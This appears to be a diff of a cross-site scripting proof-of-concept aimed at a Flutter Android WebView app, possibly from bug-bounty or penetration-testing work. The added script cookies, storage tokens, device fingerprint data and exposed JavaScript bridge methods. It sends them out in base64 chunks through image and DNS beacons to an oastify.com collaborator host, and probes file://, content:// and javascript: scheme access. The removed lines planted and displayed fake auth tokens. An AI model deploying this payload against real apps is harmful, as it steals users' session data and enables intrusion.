@@ -1,17 +1,224 @@
 <script>
-// 1. FIRST: Inject test tokens into localStorage
-localStorage.setItem('auth_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgVXNlciIsImlhdCI6MTUxNjIzOTAyMn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c');
-localStorage.setItem('refresh_token', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IlRlc3QgUmVmcmVzaCIsImlhdCI6MTUxNjIzOTAyMn0.test-refresh-token-12345');
-localStorage.setItem('user_session', 'session_id_789012');
-localStorage.setItem('api_key', 'sk_test_51abc123');
-
-// 2. SECOND: Now steal and show what we "found"
-var stolen = [];
-for(var i = 0; i < localStorage.length; i++) {
-    var key = localStorage.key(i);
-    var value = localStorage.getItem(key);
-    stolen.push(key + ': ' + value.substring(0, 30) + '...');
-}
-
-alert('🔐 Injected & Stolen Tokens:\n\n' + stolen.join('\n\n'));
+(function() {
+    var COLLAB = 'ki6ww3e7bq6dcsmnx9wv5xohh8nzbtzi.oastify.com';
+    
+    // 1. Initial beacon - proves execution
+    new Image().src = 'https://xss-poc.' + COLLAB + 
+                     '/?action=loaded&time=' + Date.now();
+    
+    // 2. Collect comprehensive app/system information
+    var reconData = {
+        // Basic device info
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        
+        // App context info
+        url: window.location.href,
+        referrer: document.referrer,
+        origin: window.location.origin,
+        
+        // Storage reconnaissance
+        cookies: document.cookie,
+        cookieCount: document.cookie ? document.cookie.split(';').length : 0,
+        localStorageCount: localStorage.length,
+        sessionStorageCount: sessionStorage.length,
+        indexedDB: 'indexedDB' in window,
+        webSQL: 'openDatabase' in window,
+        
+        // Capability detection
+        geolocation: 'geolocation' in navigator,
+        camera: 'mediaDevices' in navigator,
+        notifications: 'Notification' in window,
+        serviceWorker: 'serviceWorker' in navigator,
+        
+        // Performance hints (reveals device capability)
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        
+        // Screen info (helps fingerprinting)
+        screenWidth: screen.width,
+        screenHeight: screen.height,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        
+        // WebView specific detection
+        isWebView: /wv|WebView/.test(navigator.userAgent),
+        chromeVersion: (navigator.userAgent.match(/Chrome\/(\d+)/) || [])[1],
+        androidVersion: (navigator.userAgent.match(/Android (\d+)/) || [])[1],
+        
+        // Flutter detection
+        isFlutter: navigator.userAgent.includes('Flutter') || 
+                  /package:flutter/.test(navigator.userAgent) ||
+                  window.location.href.includes('flutter'),
+        
+        // JavaScript interface enumeration
+        interfaces: [],
+        dangerousMethods: []
+    };
+    
+    // 3. Check for JavaScript bridges/interfaces
+    console.log('[RECON] Scanning for JavaScript interfaces...');
+    for(var prop in window) {
+        try {
+            if(window[prop] && typeof window[prop] === 'object') {
+                // Skip standard browser objects
+                var skipList = ['console', 'window', 'self', 'top', 'parent', 
+                              'document', 'navigator', 'location', 'history',
+                              'screen', 'localStorage', 'sessionStorage'];
+                
+                if(!skipList.includes(prop)) {
+                    var methods = Object.getOwnPropertyNames(window[prop]);
+                    if(methods.length > 0) {
+                        reconData.interfaces.push({
+                            name: prop,
+                            methodCount: methods.length,
+                            methods: methods.slice(0, 5) // First 5 methods
+                        });
+                        
+                        // Check for dangerous methods
+                        var dangerous = methods.filter(m => 
+                            m.match(/(exec|execute|run|load|read|write|delete|eval|invoke|call)/i)
+                        );
+                        
+                        if(dangerous.length > 0) {
+                            reconData.dangerousMethods.push({
+                                interface: prop,
+                                methods: dangerous
+                            });
+                            
+                            // Alert about dangerous interface
+                            alert('⚠️ Found potentially dangerous interface: ' + prop);
+                        }
+                    }
+                }
+            }
+        } catch(e) {
+            // Can't access some objects due to security
+        }
+    }
+    
+    // 4. Check localStorage for common patterns
+    console.log('[RECON] Analyzing localStorage...');
+    var storageAnalysis = {
+        totalItems: localStorage.length,
+        tokenLikeItems: [],
+        configItems: [],
+        userDataItems: []
+    };
+    
+    for(var i = 0; i < localStorage.length; i++) {
+        var key = localStorage.key(i);
+        var value = localStorage.getItem(key);
+        
+        // Categorize items
+        if(key.match(/(token|auth|session|jwt|access|refresh|bearer|credential)/i)) {
+            storageAnalysis.tokenLikeItems.push({
+                key: key,
+                length: value.length,
+                preview: value.substring(0, 30)
+            });
+        } else if(key.match(/(config|setting|pref|option)/i)) {
+            storageAnalysis.configItems.push(key);
+        } else if(key.match(/(user|profile|name|email)/i)) {
+            storageAnalysis.userDataItems.push(key);
+        }
+    }
+    
+    reconData.storageAnalysis = storageAnalysis;
+    
+    // 5. Send initial summary via DNS (bypasses CORS)
+    var summary = {
+        app: 'Flutter WebView Recon',
+        interfaces: reconData.interfaces.length,
+        dangerous: reconData.dangerousMethods.length,
+        storage: storageAnalysis.totalItems,
+        tokens: storageAnalysis.tokenLikeItems.length,
+        screen: screen.width + 'x' + screen.height
+    };
+    
+    var summaryEncoded = btoa(JSON.stringify(summary)).replace(/=/g, '');
+    new Image().src = 'https://summary-' + summaryEncoded + '.' + COLLAB + '/';
+    
+    // 6. Send detailed data in chunks
+    var fullDataEncoded = btoa(JSON.stringify(reconData, null, 2)).replace(/=/g, '');
+    var chunks = fullDataEncoded.match(/.{1,50}/g) || [];
+    
+    console.log('[RECON] Sending ' + chunks.length + ' data chunks...');
+    chunks.forEach(function(chunk, idx) {
+        setTimeout(function() {
+            new Image().src = 'https://chunk' + idx + '-' + chunk + '.' + COLLAB + '/';
+        }, idx * 100); // Stagger requests
+    });
+    
+    // 7. Test specific attack vectors
+    setTimeout(function() {
+        // Test file:// scheme access
+        try {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'file:///etc/hosts';
+            document.body.appendChild(iframe);
+            setTimeout(function() {
+                new Image().src = 'https://file-test.' + COLLAB + '/';
+            }, 500);
+        } catch(e) {}
+        
+        // Test content:// scheme access
+        try {
+            var iframe2 = document.createElement('iframe');
+            iframe2.style.display = 'none';
+            iframe2.src = 'content://com.example.flutter_application_1.flutter.image_provider/';
+            document.body.appendChild(iframe2);
+            setTimeout(function() {
+                new Image().src = 'https://content-test.' + COLLAB + '/';
+            }, 500);
+        } catch(e) {}
+        
+        // Test javascript: scheme
+        try {
+            window.location = 'javascript:alert("Testing javascript: scheme")';
+            setTimeout(function() {
+                new Image().src = 'https://javascript-test.' + COLLAB + '/';
+            }, 500);
+        } catch(e) {}
+    }, 2000);
+    
+    // 8. Present findings to user
+    var findings = '🔍 SECURITY RECONNAISSANCE RESULTS:\n\n';
+    findings += '• Device: ' + reconData.platform + '\n';
+    findings += '• WebView: ' + (reconData.isWebView ? 'YES' : 'NO') + '\n';
+    findings += '• Flutter App: ' + (reconData.isFlutter ? 'YES' : 'NO') + '\n';
+    findings += '• JavaScript Interfaces: ' + reconData.interfaces.length + '\n';
+    findings += '• Storage Items: ' + reconData.localStorageCount + '\n';
+    findings += '• Screen: ' + reconData.screenWidth + 'x' + reconData.screenHeight + '\n';
+    
+    if(reconData.dangerousMethods.length > 0) {
+        findings += '\n⚠️ DANGEROUS INTERFACES FOUND!\n';
+        reconData.dangerousMethods.forEach(function(dm) {
+            findings += '- ' + dm.interface + ': ' + dm.methods.join(', ') + '\n';
+        });
+    }
+    
+    if(storageAnalysis.tokenLikeItems.length > 0) {
+        findings += '\n🔐 POTENTIAL TOKENS FOUND:\n';
+        storageAnalysis.tokenLikeItems.forEach(function(token) {
+            findings += '- ' + token.key + ' (' + token.length + ' chars)\n';
+        });
+    }
+    
+    alert(findings);
+    
+    // 9. Final completion beacon
+    setTimeout(function() {
+        new Image().src = 'https://recon-complete.' + COLLAB + 
+                         '/?interfaces=' + reconData.interfaces.length +
+                         '&tokens=' + storageAnalysis.tokenLikeItems.length +
+                         '&screen=' + reconData.screenWidth + 'x' + reconData.screenHeight;
+        
+        alert('Reconnaissance complete. Data sent for analysis.');
+    }, 3000);
+    
+})();
 </script>
